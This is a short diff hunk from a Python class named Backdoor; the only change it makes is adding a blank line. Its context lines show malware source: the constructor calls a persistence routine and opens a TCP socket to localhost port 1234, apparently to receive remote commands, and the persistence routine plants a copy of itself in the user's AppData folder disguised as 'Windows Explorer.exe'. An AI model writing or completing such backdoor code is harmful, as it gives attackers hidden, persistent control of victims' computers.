@@ -14,6 +14,7 @@ class Backdoor:
 		self.become_persistent()
 		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		self.connection.connect(("localhost",1234))
+		
 	def become_persistent(self):
 		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
 		if not os.path.exists(evil_file_location):
